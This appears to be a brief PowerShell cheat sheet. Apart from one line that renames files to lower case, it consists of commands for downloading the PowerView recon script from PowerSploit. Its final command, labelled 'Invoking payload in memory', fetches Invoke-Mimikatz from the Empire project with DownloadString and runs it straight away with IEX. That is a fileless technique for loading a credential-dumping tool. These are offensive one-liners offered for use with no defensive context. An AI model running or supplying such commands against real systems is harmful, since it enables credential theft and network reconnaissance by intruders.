# powershell_cmds

## Change all file names to lower case in the current directory

```Powershell
Get-ChildItem | Rename-Item -NewName {$_.Name -replace $_.Name, $_.Name.ToLower()}
```

## Downloading file from raw github content via System.Net.WebClient
```Powershell
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

## Downloading file from raw github content via Invoke-WebRequest (slower for downloading files)

```Powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
## Invoking payload in memory

```Powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
